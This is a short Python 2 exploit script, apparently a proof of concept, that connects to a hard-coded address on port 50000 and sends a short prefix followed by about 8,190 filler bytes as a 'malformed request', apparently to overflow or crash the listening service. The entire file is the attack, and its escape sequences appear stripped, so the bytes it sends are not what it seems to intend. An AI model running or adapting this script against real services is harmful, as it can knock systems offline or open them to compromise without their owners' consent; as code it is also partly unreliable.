#!/usr/bin/python
 
from struct import pack
import socket,sys
import os

target="192.168.0.1"
port=50000

junk = "x41" * 8190 

print "[*] Connecting to Target " + target + "..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((target, port))
    print "[*] Connected to " + target + "!"
except:
    print "[!] " + target + " didn't respondn"
    sys.exit(0)

print "[*] Sending malformed request..."
s.send("x4dx53x47" + junk)

print "[!] Exploit has been sent!n"
s.close()
